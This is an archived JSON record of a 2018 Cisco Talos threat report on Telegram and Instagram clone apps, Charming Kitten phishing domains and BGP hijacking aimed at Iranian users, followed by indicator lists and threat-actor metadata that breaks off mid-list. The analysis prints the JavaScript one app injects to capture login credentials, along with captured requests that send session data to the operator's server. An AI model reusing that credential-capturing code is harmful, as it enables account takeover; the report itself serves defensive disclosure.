{
    "id": "bb7cd16f-0323-42c0-8dd8-1fd19202f383",
    "created_at": "2023-01-12T15:04:27.428918Z",
    "updated_at": "2025-03-27T02:16:20.723087Z",
    "deleted_at": null,
    "sha1_hash": "a3a4f67e764f20048166537678f7259ec101e6ba",
    "title": "2018-11-05 - Persian Stalker pillages Iranian users of Instagram and Telegram",
    "authors": "",
    "file_creation_date": "2022-05-27T02:12:08Z",
    "file_modification_date": "2022-05-27T02:12:08Z",
    "file_size": 2056117,
    "plain_text": "# Persian Stalker pillages Iranian users of Instagram and Telegram\n\n**blog.talosintelligence.com/2018/11/persian-stalker.html**\n\n_[This blog post is authored by Danny Adamatis,](https://twitter.com/dadamitis)_ _[Warren Mercer,](https://twitter.com/SecurityBeard)_ _[Paul Rascagneres,](https://twitter.com/r00tbsd)_ _[Vitor Ventura and with the contributions of Eric Kuhla.](https://twitter.com/_vventura)_\n\n## Introduction\n\nState-sponsored actors have a number of different techniques at their disposal to remotely gain access to social media and secure messaging\napplications. Starting in 2017 and continuing through 2018, Cisco Talos has seen different techniques being used to attack users and steal\ntheir private information. These techniques used fake login pages, malicious apps disguised as their legitimate counterparts and BGP\nhijacking, and were specifically targeting Iranian users of the secure messaging app Telegram and the social media site Instagram.\n\n[Telegram has become a popular target for greyware in Iran, as the app is used by an estimated 40 million users. While it's mostly used for daily](http://aftabnews.ir/fa/news/502050)\ncommunication, protest organizers also used it in the past to organize demonstrations against the Iranian government, specifically in\nDecember 2017. In a few instances, the Iranian government asked Telegram to [shut down certain channels for \"promoting violence.\" The](https://www.telegraph.co.uk/news/2017/12/30/iranian-students-clash-police-tehran-protests-enter-third-day/)\ntactics outlined in this post have been in use since 2017 in an effort to gather information about Telegram and Instagram users. The campaigns\nvary in complexity, resource needs and methods. Below, we outline examples of a network attack, application clones and classic phishing. It is\nour belief that these campaigns were used to specifically target Iranian users of the Telegram app in an effort to steal personal and login\ninformation.\nOnce installed, some of these Telegram \"clones\" have access to mobile devices' full contact lists and messages, even if the users are also\nusing the legitimate Telegram app. In the case of phony Instagram apps, the malicious software sends full session data back to backend\nservers, which allows the attacker to take full control of the account in use. We declare with high confidence that these apps should be\nclassified as \"greyware.\" It is not malicious enough to be classified as malware, but is suspicious enough to be considered a potentially\nunwanted program (PUP). This kind of software is difficult to detect, as it typically fulfills its functions that are expected by the user (ex. send\nmessages). The only time this kind of software is detected by security researchers is if it has an impact somewhere else. Talos eventually\ndiscovered several pieces of software that have the potential to be used in far-reaching campaigns. We believe this greyware has the potential\nto reduce the privacy and security of mobile users who use these apps. Our research revealed that some of these applications send data back\nto a host server, or are controlled in some way from IP addresses located in Iran, even if the devices are located outside the country.\n\nAnother method we saw in the Iranian attacks was the creation of fake login pages. Even though this isn't an advanced technique, it is effective\nagainst users who aren't as aware of cybersecurity as they should be. Iran-connected groups like \"Charming Kitten\" have been using this\ntechnique for a while targeting secure messaging apps. Some actors are also hijacking the device's BGP protocol. This technique redirects the\ntraffic of all routers, without the device considering the original of those new routes. In order to hijack BGP, there needs to be some sort of\ncooperation from an internet service provider (ISP), and is easily detectable, so the new routes won't be in place for very long.\n\nTalos hasn't found a solid connection between the several attacks we've observed, but all of them target Iran and their nationals and the\nTelegram app. Although this post focuses on Iran, mobile users across the globe still need to be aware that these techniques could be used by\nany threat actor in any country, state-sponsored or not. This is especially prevalent in countries like Iran and Russia, where apps like Telegram\nare banned, and developers create clones that appear on official and unofficial app stores to replicate Telegram's services.\n\nA regular user can't do anything about the BGP hijacking, but using legitimate applications from the official application stores reduces the risk.\nThis same rule applies to the cloned applications, installing applications from untrusted sources implies a certain degree of risk that the users\nmust be aware of. In both situations, this risk is substantially increased when the applications are unofficial \"enhanced functionality\"\n\nli ti h th il bl th ffi i l G l Pl t\n\n\n-----\n\n## Tactics\n\n### Functionality enhancement applications (grey)\n\n**Andromedaa.ir and Cambridge Universal Academy**\n\n**Description of andromedaa.ir**\n\nTalos identified a software developer completely focused on the Iranian market. The publisher goes by the name \"andromedaa.ir\" on both iOS\nand Android platforms. It develops software intended to increase users' exposure on social media networks, like Instagram, as well as the\nnumber of Iranian users on certain Telegram channels.\n\nWhile looking at the website, and more specifically the installation links, it is clear that none of these applications are published in the official\napplication stores (Google or Apple), which is likely due to sanctions put in place against Iran by the U.S. government.\n\nWhois information for andromedaa.ir\n\nThe andromedaa.ir domain is registered with the h0mayun@outlook.com email address. This is the same email address used to registered\nother domains for the cloned Instagram and Telegram applications (see other sections below).\n\nTalos identified various domains after analysing the whois information associated with the domain andromedaa[.]com, all but one registered\nwith the same phone number.\n\nA partial list of the domains found\n\n\n-----\n\nWe scanned the IP address associated with the aforementioned domains, which revealed a pattern in their use of SSL certificates.\n\nCertificate information\n\nThis SSL certificate analysis revealed an additional domain — flbgr[.]com — whose whois information was privacy protected. Based off the low\nprevalence of those values in the SSL certificate, Talos associates this domain to the same threat actor with high confidence. The domain\nflbgr[.]com was registered on Aug. 6, 2018, making it the most recently registered domain, and resolved to the IP address 145.239.65[.]25.\nCisco Farsight data showed other domains also resolve to that same IP address.\n\nList of domains associated with the same IP address\n\nTalos then discovered an SSL certificate with a common name of followerbegir[.]ir that had a sha256 fingerprint. We also found another\ncertificate that was very similar in nature. However, there appeared to be two typos: one in the common name field \"followbeg.ir,\" and another\nin the organization field where it's identified as \"andromeda,\" instead of andromedaa.\n\n\n-----\n\nCertificate information\n\n**Description of Cambridge Universal Academy**\n\nAndromedaa.ir published the iOS application, but it's signed with a developer certificate issued to Cambridge Universal Academy Ltd. This is\nan England and Wales-registered company that offers iOS development services. This same company is owned by an Iranian citizen who\nowns at least four other companies in four different countries: England, U.S., Turkey and Estonia. All of those companies share the same\nservices, offering a web page similar in content.\n\nGoogle flagged the URL mohajer.co.uk for phishing, which might be related to the fact that this site, along with Mohajer.eu, are offering visa\nservices for the U.K., U.S., Canada, Australia and other countries in the European Economic Area.\n\n**Business model**\n\nAll of the andromedaa.ir applications are meant to increase users' exposure on Instagram or Telegram by increasing the likes, comments,\nfollowers or even the number of users in a specific Telegram channel. All this comes with the guarantee that only Iranian users will perform\nsuch actions. The same operator also manages (see previous section) sites like lik3.org, which sells the same kind of exposure.\n\n\n-----\n\nPrice list (original HTML errors where kept, translation by google.com)\n\nWhile these services are not illegal, they definitely are \"grey\" services. On the same site, we can see marketing highlights the benefits of using\nthis service rather than others.\n\nLik3.org marketing (translation by google.com)\n\nIt's worth noting that the operators state that they will never ask for the customer's password for Instagram and that all of the site's users are\nreal. The reality is that the operator doesn't need the customer's password for Instagram because an Instagram user doesn't need to log into\nthat user's account to \"like\" their post.\n\nInstead, the operator has access to thousands of user sessions. They have access to all users that have installed the \"free\" applications,\nmeaning they can do whatever they want during those sessions. While the operator uses a different method for the Telegram applications,\nthose can also lead to complete session takeover. See the \"Application examples\" section for more details.\n\nThe danger here is not that this operator can make money, it's that users' privacy is at risk. The same methods applied to control Instagram\nand Telegram accounts give the operator access to the user's full contact list, future messages on Telegram, and the user's full Instagram\nprofile. Iran banned the usage of these sites, especially Telegram, since chats can be encrypted, locking out government access. By using\nthese methods, the operator could compromise the endpoint and access all future chats.\n\nAlthough most of the backend is hosted in Europe, all the tested applications perform an update check against a server located in Iran. Again,\nthis is not malicious per se, but given the context of forbidden applications, this potentially gives the government a single point of access to\nthousands of mobile devices. However, Talos cannot establish a direct relationship between this operator and any government entity, Iranian or\notherwise.\n\n\n-----\n\n**pp cat o** **e a** **p es**\n\n**Follower Begir Instagram iOS application**\n\nThe first application we analyzed was ﻓﺎﻟﻮﺋﺮ ﺑﮕﯿﺮ اﯾﻨﺴﺘﺎﮔﺮام (\"Follower Begir Instagram\") designed for iOS. Andromedaa.ir published this\napplication, and it's signed by Cambridge Universal Academy. This application is an overlay to Instagram.\n\nFirst screen after logging in\n\nThe developer added some features such as virtual currency and Persian language support, among others.\n\nCertificate information\n\nThe application uses the iOS WebKit framework in order to display web content, which in this case displays the Instagram page. Upon the first\nexecution, the application displays the Instagram login page injected with the following JavaScript snippet.\n\ndocument.addEventListener('click', function() {\n\n\n-----\n\nt y {\n\nvar tu = document.querySelector('[name=\"username\"]');\n\nvar tp = document.querySelector('[name=\"password\"]');\n\nvar tpV = (typeof tp == 'undefined') ? '' : tp.value;\n\nvar tuV = (typeof tu == 'undefined') ? '' : tu.value;\n\n} catch (err) {\n\nvar tuV = '';\n\nvar tpV = ''  }\n\nvar bd = document.getElementsByTagName('body')[0].innerText;\n\nvar messageToPost = {\n\n'pu': tuV,\n\n'pp': tpV,\n\n'bd': bd\n\n}; window.webkit.messageHandlers.buttonClicked.postMessage(messageToPost);}, false);\n\nThe purpose of this code is to give the control to the iOS application when the user clicks the \"Connection\" button. The application receives an\nevent, and the value of the username and password fields, along with the body of the page. The event is handled by the\nfollowerbegir.AuthorizationUserController userController:didReceiveScriptMessage() function. Afterward, the application authenticates on\nInstagram servers.\n\nDuring this investigation, we discovered that the password was not directly sent to the backend server (v1[.]flbgr[.]com). Here is the data sent\nto the ping.php web page:\n\nPOST /users/ping.php?m=ios&access=[redacted]&apk=35&imei=[redacted]&user_details=[redacted]&tokenNumber=[redacted]\nHTTP/1.1\n\nHost: v1.flbgr.com\n\nSESSIONID: [redacted]\n\nHEADER: vf1IOS: 3361ba9ec3480bcd3766e07cf6b4068a\n\nConnection: close\n\nAccept: */*\n\nAccept-Language: fr-fr\n\nUser-Agent:\n%D9%81%D8%A7%D9%84%D9%88%D8%A6%D8%B1%20%D8%A8%DA%AF%D9%8A%D8%B1%20%D8%A7%DB%8C%D9%86%D8%\nCFNetwork/893.14.2 Darwin/17.3.0\n\nAccept-Encoding: gzip, deflate\n\nContent-Length: 0\n\nThe operator of the backend server receives the mobile type (iOS), token and user data, such as username, profile picture and full name, if the\naccount is private.\n\nThe SESSIONID variable contains the most sensitive information: the header of an Instagram connection with the valid cookie. The owner of\nthe server can hijack the Instagram session of the user with the information available in this field.\n\nThe application has an update mechanism, which is based out of Iran, unlike the majority of the infrastructure. When the application starts, it\nsends a request to ndrm[.]ir with the current version of the app:\n\nPOST /start/fl.php?apk=35&m=ios HTTP/1.1\n\n\n-----\n\nost d\n\nHEADER: vf1\n\nConnection: close\n\nIOS: 3361ba9ec3480bcd3766e07cf6b4068a\n\nAccept: */*\n\nUser-Agent:\n%D9%81%D8%A7%D9%84%D9%88%D8%A6%D8%B1%20%D8%A8%DA%AF%D9%8A%D8%B1%20%D8%A7%DB%8C%D9%86%D8%\nCFNetwork/893.14.2 Darwin/17.3.0\n\nAccept-Language: en-gb\n\nAccept-Encoding: gzip, deflate\n\nContent-Length: 0\n\nIf the version is not up to date, the application redirects the user to the andromedaa store:\n\nInstructions to trust the developer certificate\n\nThe store contains the new version of the application and a procedure to trust the previously mentioned developer certificate. This allows the\ndevelopers to update both the certificate trust and the application at any point in time.\n\n**Ozvbegir(ozvdarozv) application**\n\nThe Ozvbegir application's intent is to increase the number of members of the user's Telegram channel. This app guarantees that these will\nonly be Iranian users.\n\n\n-----\n\nApplication description (translation by Google Translate)\n\nWe analyzed the Android version of the application. The application package is signed by a self-signed certificate that's valid until the year\n3014.\n\nMost recent Ozvbegir certificate\n\nPrevious versions of the same application also used a self-signed certificate, but both the issuer and the subject information was clearly false.\n\nOlder version's certificate\n\nJust like the previous application, the Ozvbegir application is repackaged and includes original classes from the Telegram application.\n\nOzvbegir classes structure\n\n\n-----\n\nIn fact, we found signs in the manifest that this package was actually the original Telegram package, which was changed to accommodate the\napplication code. The names and labels used on the manifest have several references to the Telegram original application and even the API\nkey used for the Android Maps app was kept the same.\n\nUpdate check and reply\n\nJust like the previous application, this one also checks for new versions by performing an HTTP request to the ndrm.ir domain. If the\napplication is not the latest version, it receives both a message and link to obtain the most recent version, which can be anything the operator\nwants. In this case, it's from cafebazaar.ir, an Iranian Android application store.\n\nThe domain ndrm.ir is registered under the same email address as all the other application-supporting domains. However, this is the only one\nthat is actually hosted in Iran and coincidently is the one with the ability to upgrade the application on mobile devices.\n\nThe application has a look and feel that strongly resembles the original Telegram application. Just like the original Telegram application, the\nuser is requested to provide their phone number to register in Telegram when they first open the app.\n\nPhone number request\n\nThis registration creates a shadow session for the same device, giving the application access to the full contact list and future messages.\n\n\n-----\n\nSessions created on a single phone\n\nThe application contacts the backend server when the registration process is finished, supplying information about the user and the mobile\ndevice.\n\nGET /users/ping.php?access_hash=[redacted]&inactive=0&flags=1107&last_name=%21%21empty%21%21&phone=[redacted]&tg_id=\n\n_[redacted]&m=d&user_name=[redacted]&first_name=Pr2&network=SYMA&country=[redacted]&apk=570&imei=_\n\n_[redacted]&brand=motorola&api=24&version=7.0&model=Moto+G+%285%29&tut=[redacted] HTTP/1.1_\n\nTOKEN: ab1ccf8fd77606dda6bb5ecc858faae1\n\nNUM: df27340104277f1e73142224d9cb59e8\n\nHEADER: bt6\n\nADMIN: web\n\nHost: v1.ozvdarozv.com\n\nConnection: close\n\nUser-Agent: Apache-HttpClient/4.5.1 (java 1.4)\n\nWe identified more than 1 million subscribers on the Telegram channel who automatically joined when they first opened the application.\n\n\n-----\n\nChannel information\n\n**Bitgram_dev**\n\nBitgram_dev, unlike the previous developers, does not have a large internet footprint. Currently, it has two published applications — AseGram\nand BitGram — on Google Play. The applications were available from the beginning of September to the beginning of October and were\ndownloaded almost 10,000 times.\n\nAseGram and BitGram on Google Play\n\nPublisher information\n\n\n-----\n\nGiven that AseGram and BitGram aim to circumvent the ban that Iran put on Telegram, it's reasonable to think that the publishers would want\nto have a small footprint as a self-preservation measure.\n\n### Application examples\n\n**AseGram**\n\nThe AseGram application is available on the Google Play store for certain countries. Even though the application was downloaded from the\nGoogle Play store, the certificate signing the package is completely useless security-wise.\n\nAseGram certificate\n\nThis Telegram clone was clearly created to intercept all communications from the user. However, this one takes a different approach than the\nothers: This software uses a proxy defined at the Telegram package layer in order to intercept traffic.\n\nSet proxy code\n\nJust like in previous applications, AseGram is a repackaging of the legitimate Telegram for Android. This technique avoids all the problems that\na developer may find when trying to implement its own Telegram client.\n\nThe service org.pouyadr.Service.MyService starts upon boot. This calls the MessagesController.getGlobalMainSettings() from the original\nTelegram package and will change the settings to include the proxy configuration.\n\n\n-----\n\ne co gu at o deta s a e a dcoded to t e a a e a d a e e c ypted us g S t a ey de ed o a dcoded a ues\nconcatenated with package-specific values.\n\nThe application contacts three domains: talagram.ir, hotgram.ir and harsobh.com, all of which are registered to companies in Iran. In this case,\nthe application administrator has access to the communications.\n\nThis application creates a service that can't be disabled just by closing the application and starts when the device boots up. The service\ncontains the necessary code to install new packages, but the action is handled by the standard package manager in the system. This service\nis also responsible for contacting IP addresses located in Iran. In fact, this uses the back end of the Telegram clone called \"Advanced\nTelegram,\" or (Golden Telegram). This application is available at cafebazaa.ir, an Iranian state-sanctioned Android application store.\n\nAdvanced Telegram cafebazaar page (translation by Google translate)\n\nIt is important to emphasize that the first sentence on this page is \"اﯾﻦ ﺑﺮﻧﺎﻣﻪ در ﭼﺎرﭼﻮب ﻗﻮاﻧﯿﻦ ﮐﺸﻮر ﻓﻌﺎﻟﯿﺖ ﻣﯿﮑﻨﺪ\" (\"This program operates within the\nframework of the laws of the country\"). It is hard to find an legitimate use case where an application that circumvents a ban should contact the\nsame servers used by a cloned application that is vetted by the same country that applied the ban, making these communications highly\nsuspicious.\n\nThe application also contains code to use socks servers located in several countries, which can be used to circumvent the ban. However,\nduring our research we have never seen these being used. On the other side, if the physical device isn't in Iran, we have seen traffic going to\nservers located in the country, which doesn't seem compatible with an application that is trying to avoid a ban on Telegram in Iran.\n\n### Fake websites\n\n**Spoofed Telegram Websites**\n\nThe most straightforward approach to gain access to an end user's Telegram account is to socially engineer the user into entering their\nusername and password into a fraudulent website controlled by the attacker. We observed the domain youtubee-videos[.]com in the wild,\nwhich mimicked the web login page for Telegram.\n\nFake Telegram login page\n\n\n-----\n\nThis domain was registered on July 25, 2017. Based on the tactics, techniques and procedures (TTPs), such as the domain registration\npattern, the email address — nami.rosoki@gmail[.]com — used to register this domain, as well as other domains and its passive Domain\nName Servers (pDNS) records suggest that this domain is associated with the Charming Kitten group. This same domain was independently\n[associated with Charming Kitten by another cybersecurity firm, Clearsky. Upon further inspection of the web page source code, it appears as](https://www.clearskysec.com/wp-content/uploads/2017/12/Charming_Kitten_2017.pdf)\n[though the website was built using the GitHub project called \"Webogram,\" there were also strings in the source page to suggest this website's](https://github.com/zhukov/webogram)\ndisplay was designed for iPhones.\n\nSource code, GitHub.com reference\n\n**Newly identified Charming Kitten domains**\n\nWhile Talos was researching the spoofed Telegram websites used by the Charming Kitten actors, we discovered a number of other malicious\ndomains that contained keywords such as \"mobile,\" \"messenger,\" and in some cases, \"hangouts,\" Which is likely a reference to the Google\nchat application called Hangouts. This suggests that these actors had continuous interest in gaining access to end users' mobile devices and\nspecifically their chat messages.\n\nThese domains were also registered using the same Modus operandi as all the other domains associated with this group in 2017. Through\nanalyzing pDNS records, Talos discovered additional domains that resolved to the same IP address.\n\n\n-----\n\nThis clearly demonstrates that this group has an ongoing activity with a focus on user credentials and messaging applications.\n\n### BGP Routing Anomalies\n\n**Background**\n\n[While monitoring BGPStream, Cisco's database of Border Gateway Protocol (BGP) announcement, Talos noticed some routing anomalies](https://bgpstream.com/)\noriginating from an Iranian-based autonomous system number (ASN) 58224. For those unfamiliar with this protocol, BGP is defined in Request\nfor Comments (RFC) 4271, as \"an inter-Autonomous System routing protocol.\" In this context, \"a route is defined as a unit of information that\npairs a set of destinations with the attributes of a path to those destinations.\" In short, this protocol allows for internet communications to occur\nwhen requesting a resource located outside of the requested network or autonomous system.\n\nBGP is used across the internet to assist with the selection of the best path routing. It's important to note this can be manipulated at ISP levels\ndepending on various factors, which BGP allows for route selection. BGP optimizes the routing of internet traffic through the speaking system,\nwhich RFC 4271 defines as:\n\nThe primary function of a BGP speaking system is to exchange network reachability information with other BGP systems. This network\nreachability information includes information on the list of Autonomous Systems (ASes) that reachability information traverses.\n\nThese speaking systems serve as a platform for routers to send out \"update messages\" to neighboring systems. The process for \"changing the\nattribute(s) of a route is accomplished by advertising a replacement route. The replacement route carries new [changed] attributes and has the\nsame address prefix as the original route.\"\n\nWhile this was designed as a feature to combat networking issues, there was no adequate security mechanism added to prevent it from being\nabused. BGP offers no mechanism for security other than some methods like MD5 passwords for neighbours, IPSec or GTSM. None of these\nare default requirements and as such are not necessarily widely used. This could allow someone to send out an update message with an\nalternate route to the same prefix or AS, even if there was no issue with the primary route.\n\nThis could result in some traffic passing through a predetermined, or sub-optimal route for the victim. These routing deviations are sometimes\nreferred to as BGP hijacking sessions. BGP hijacking sessions' effectiveness are measured based on the number of BGP peers who receive\nthe update through messages. The more peers who receive the update message, the more likely traffic is being routed through the alternative\n\n\n-----\n\nsub opt a pat, t at s p e co gu ed by t e acto\n\n**Pre-Planned Routing Activity from ASN 58224**\n\n[One interesting BGP routing anomaly occurred on June 30, 2018 at 07:41:28 UTC. During this event, the Iranian-based ASN 58224](https://bgpstream.com/event/141474)\nannounced an update for the prefix 185.112.156.0/22. The Iranian telecommunications provider Iran Telecommunication Company PJS owned\nthe ASN that sent out the update message.\n\nThis range potentially being hijacked was associated with Hungarian-based internet service provider (ISP) DoclerWeb Kft. Nine BGPmon\npeers detected this event, and it lasted for two hours and 15 minutes until a new update message was disseminated. While this event was\nquite small in scale, this could have been a trial run for a larger BGP hijack attempt.\n\nThere were more significant BGP anomalies that originated from that same Iran-based ASN 58224. On July 30, 2018 at 06:28:25 UTC, four\nBGP routes were announced as being \"more specific\" at the exact same time, down to the second, impacting communications with Telegram.\nWhen routers received this update message through the speaking system, they began routing some traffic destined to the Telegram servers\nthrough the ASN 58224. This campaign proved to be particularly effective, since a large number of BGPmon peers observed it, suggesting that\nit propagated throughout the region via the speaking system. Just like the event one month prior, all routers received a corrected update\nmessage two hours and 15 minutes later, ending the hijack.\n\n**How BGP Hijacking could have enabled computer network operations**\n\nTheoretically, this announcement could have one component of an operation to compromise communications with Telegram servers. This\nhijacking session led to some Telegram messages being sent to an Iranian telecommunications provider. Other nation-state actors have used\n[this technique in order to deliver malware, as documented by other security researchers, two months prior in May 2018. Once the traffic is](https://www.welivesecurity.com/2018/05/22/turla-mosquito-shift-towards-generic-tools/)\n[routed through a desired ISP, it could be subject to modification and inspection. There has been open-source reporting that suggests that Iran-](https://www.reuters.com/article/us-iran-cyber-telegram-exclusive/exclusive-hackers-accessed-telegram-messaging-accounts-in-iran-researchers-idUSKCN10D1AM)\nbased telecommunication providers have previously cooperated with Iranian government requests to obtain communications. The article\nsuggests telecommunications companies provided government officials with Telegram SMS verification codes needed to gain access to\nTelegram accounts.\n\nThis particular capability would be attractive, since it could allow the actors to route traffic in neighboring ASNs through Iran. This could allow\nthe threat actors to gain access to devices in nearby countries and compromise users who utilized non-Iranian telecommunications providers.\n\nThe Iranian Minister of Information and Communications Technology, Mohammad-Javad Azari Jahromi, acknowledged this event and stated it\n[will be investigated. Nothing further has been publicly released regarding this investigation from the Iranian government.](https://en.mehrnews.com/news/136252/Minster-orders-investigation-into-data-hijacking-charges-against)\n\n## Conclusions\n\nThe three techniques we discussed here are not the only ones that state-sponsored actors can use to deploy surveillance mechanisms\ntargeting their citizens. The topic of mass internet firewalling and surveillance deployment has been in the news before. Some of these\ncampaigns have also targeted specific applications, such as Telegram. However, these apparently unrelated events all share at least two\ncommon denominators: Iran and Telegram. These denominators should be far apart, since Iran has banned Telegram in the country. But we\n\n\n-----\n\nou d t at t e e a e se e a e eg a c o es t se e a t ousa ds sta at o s t at so e o co tact add esses ocated a, so e o\nthem that advertise the fact that they can circumvent the ban. The activity of these applications is not illegal, but it gives its operators total\ncontrol over the messaging applications, and to some extent, users' devices.\n\nThe long-lasting activity of groups like Charming Kitten, even while using classic phishing techniques, are still effective against users who\naren't very aware of cybersecurity. Given that the common denominator of all of these activities was the citizenship, it is understandable that\nthe vast majority of any country's population won't be as cybersecurity educated as a cybersecurity professional, so even this classic technique\ncould be highly effective.\n\nWhile it is impossible for Talos to precisely determine the intent behind the July 30 routing update messages, Talos assess with moderate\nconfidence that the updates were a deliberate act targeting Telegram-based services in the region. It is unlikely for four update messages to be\ndistributed at the exact same time, to route two different Telegram ranges through four different subnets all associated with one ASN: 58224.\nThis assessment statement also considers open-source reporting on Iran's complicated history with Telegram from passing laws banning the\nuse of Telegram, to reports of outages resulting from [Telegram's IP addresses being blocked in Iran.](https://twitter.com/InternetIntel/status/991334539388772353)\n\nAside from the victims and the applications, Talos was unable to find any solid link between each of these events. This investigation was\nfocused on Iran due to the current ban on Telegram. However, these techniques could be used by any malicious actor, being with or without\nstate sponsorship. Talos assesses with high confidence that the users' privacy is at risk when using the applications discussed in this blog\npost. The overall security concerns should be taken seriously.\n\n## IOC\n\n### Domains\n\ntalagram[.]ir\n\nhotgram[.]ir\n\nHarsobh[.]com\n\nndrm[.]ir\n\nandromedaa[.]ir\n\nbuycomment[.]ir\n\nbazdiddarbazdid[.]com\n\nyoupo[.]st\n\nim9[.]ir\n\nfollowerbegir[.]ir\n\nbuylike[.]ir\n\nbuyfollower[.]ir\n\nandromedaa[.]ir\n\n30dn[.]ir\n\nndrm[.]ir\n\nfollowerbeg[.]ir\n\nviewmember[.]ir\n\nozvdarozv[.]ir\n\nozvbegir[.]ir\n\nobgr[.]ir\n\nlikebeg[.]ir\n\nlbgr[.]ir\n\nfollowgir[.]ir\n\nfollowbegir[.]ir\n\nfbgr[.]ir\n\ncommentbegir[.]ir\n\ncbgr[.]ir\nlikebegir[.]com\n\ncommentbegir[.]com\n\nandromedaa[.]com\n\nozvbegir[.]com\n\nozvdarozv[.]com\n\nandromedaa[.]net\n\nlik3[.]org\n\nhomayoon[.]info\n\nbuylike[.]in\n\nlkbgr[.]com\n\nflbgr[.]com\n\nandromedaa[.]com\n\n\n-----\n\nob eco t ue[ ] et o\nmobilecontinue[.]network\nmobile-messengerplus[.]network\nconfirm-identification[.]name\ninvitation-to-messenger[.]space\ncom-messengersaccount[.]name\nbroadcastnews[.]pro\nyouridentityactivity[.]world\nconfirm-verification-process[.]systems\nsessions-identifier-memberemailid[.]network\nmail-profile[.]com\ndownload-drive-share[.]ga\nhangouts-talk[.]ga\nmail-login-profile[.]com\nwatch-youtube[.]live\nstratup-monitor[.]com\nXn--oogle-v1a[.]ga (ġoogle[.]ga)\nfile-share[.]ga\n\n### Hash values\n\n8ecf5161af04d2bf14020500997afa4473f6a137e8f45a99e323fb2157f1c984 - BitGram\n\n24a545778b72132713bd7e0302a650ca9cc69262aa5b9e926633a0e1fc555e98 - AseGram\n\na2cf315d4d6c6794b680cb0e61afc5d0afb2c8f6b428ba8be560ab91e2e22c0d followerbegir.ipa\n\na7609b6316b325cc8f98b186d46366e6eefaae101ee6ff660ecc6b9e90146a86 ozvdarozv.apk\n\n\n-----",
    "language": "EN",
    "sources": [
        {
            "id": "05d7b179-7656-44d8-a74c-9ab34d3df3a2",
            "created_at": "2023-01-12T14:38:44.599904Z",
            "updated_at": "2023-01-12T14:38:44.599904Z",
            "deleted_at": null,
            "name": "VXUG",
            "url": "https://www.vx-underground.org",
            "description": "vx-underground Papers",
            "reports": null
        }
    ],
    "references": [
        "https://papers.vx-underground.org/papers/Malware Defense/Malware Analysis 2018/2018-11-05 - Persian Stalker pillages Iranian users of Instagram and Telegram.pdf"
    ],
    "report_names": [
        "2018-11-05 - Persian Stalker pillages Iranian users of Instagram and Telegram.pdf"
    ],
    "threat_actors": [
        {
            "id": "82b92285-4588-48c9-8578-bb39f903cf62",
            "created_at": "2022-10-25T15:50:23.850506Z",
            "updated_at": "2025-03-27T02:00:55.501372Z",
            "deleted_at": null,
            "main_name": "Charming Kitten",
            "aliases": [
                "Charming Kitten"
            ],
            "source_name": "MITRE:Charming Kitten",
            "tools": [
                "DownPaper"
            ],
            "source_id": "MITRE",
            "reports": null
        },
        {
            "id": "08c8f238-1df5-4e75-b4d8-276ebead502d",
            "created_at": "2023-01-06T13:46:39.344081Z",
            "updated_at": "2025-03-27T02:00:03.056208Z",
            "deleted_at": null,
            "main_name": "Copy-Paste",
            "aliases": [],
            "source_name": "MISPGALAXY:Copy-Paste",
            "tools": [],
            "source_id": "MISPGALAXY",
            "reports": null
        },
        {
            "id": "a97cf06d-c2e2-4771-99a2-c9dee0d6a0ac",
            "created_at": "2022-10-25T16:07:24.349252Z",
            "updated_at": "2025-03-27T02:02:10.184406Z",
            "deleted_at": null,
            "main_name": "Turla",
            "aliases": [
                "ATK 13",
                "Belugasturgeon",
                "Blue Python",
                "CTG-8875",
                "Group 88",
                "ITG12",
                "Iron Hunter",
                "Krypton",
                "Makersmark",
                "Operation Epic Turla",
                "Operation Moonlight Maze",
                "Operation Penguin Turla",
                "Operation Satellite Turla",
                "Operation Skipper Turla",
                "Operation Turla Mosquito",
                "Operation WITCHCOVEN",
                "Pacifier APT",
                "Pensive Ursa",
                "Popeye",
                "SIG15",
                "SIG2",
                "SIG23",
                "Secret Blizzard",
                "TAG-0530",
                "Turla",
                "UNC4210",
                "Venomous Bear",
                "Waterbug"
            ],
            "source_name": "ETDA:Turla",
            "tools": [
                "ASPXSpy",
                "ASPXTool",
                "ATI-Agent",
                "AdobeARM",
                "Agent.BTZ",
                "Agent.DNE",
                "BigBoss",
                "COMpfun",
                "Chinch",
                "Cloud Duke",
                "CloudDuke",
                "CloudLook",
                "Cobra Carbon System",
                "ComRAT",
                "DoublePulsar",
                "EmPyre",
                "EmpireProject",
                "Epic Turla",
                "EternalBlue",
                "EternalRomance",
                "GoldenSky",
                "Group Policy Results Tool",
                "HTML5 Encoding",
                "HyperStack",
                "IcedCoffee",
                "IronNetInjector",
                "KSL0T",
                "Kapushka",
                "Kazuar",
                "KopiLuwak",
                "Kotel",
                "LOLBAS",
                "LOLBins",
                "LightNeuron",
                "Living off the Land",
                "Maintools.js",
                "Metasploit",
                "Meterpreter",
                "MiamiBeach",
                "Mimikatz",
                "MiniDionis",
                "Minit",
                "NBTscan",
                "NETTRANS",
                "NETVulture",
                "Neptun",
                "NetFlash",
                "NewPass",
                "Outlook Backdoor",
                "Penquin Turla",
                "Pfinet",
                "PowerShell Empire",
                "PowerShellRunner",
                "PowerShellRunner-based RPC backdoor",
                "PowerStallion",
                "PsExec",
                "PyFlash",
                "QUIETCANARY",
                "Reductor RAT",
                "RocketMan",
                "SMBTouch",
                "SScan",
                "Satellite Turla",
                "SilentMoon",
                "Sun rootkit",
                "TTNG",
                "TadjMakhal",
                "Tavdig",
                "TinyTurla",
                "TinyTurla Next Generation",
                "TinyTurla-NG",
                "Topinambour",
                "Tunnus",
                "Turla",
                "Turla SilentMoon",
                "TurlaChopper",
                "Uroburos",
                "Urouros",
                "WCE",
                "WITCHCOVEN",
                "WhiteAtlas",
                "WhiteBear",
                "Windows Credential Editor",
                "Windows Credentials Editor",
                "Wipbot",
                "WorldCupSec",
                "XTRANS",
                "certutil",
                "certutil.exe",
                "gpresult",
                "nbtscan",
                "nbtstat",
                "pwdump"
            ],
            "source_id": "ETDA",
            "reports": null
        },
        {
            "id": "8aaa5515-92dd-448d-bb20-3a253f4f8854",
            "created_at": "2024-06-19T02:03:08.147099Z",
            "updated_at": "2025-03-27T02:05:17.408118Z",
            "deleted_at": null,
            "main_name": "IRON HUNTER",
            "aliases": [
                "Belugasturgeon ",
                "Blue Python ",
                "CTG-8875 ",
                "ITG12 ",
                "KRYPTON ",
                "MAKERSMARK ",
                "Pensive Ursa ",
                "Secret Blizzard ",
                "Turla",
                "UAC-0003 ",
                "UAC-0024 ",
                "UNC4210 ",
                "Venomous Bear ",
                "Waterbug ",
                "ATK13 "
            ],
            "source_name": "Secureworks:IRON HUNTER",
            "tools": [
                " ComRAT",
                " Kazuar",
                " KopiLuwak",
                " LightNeuron",
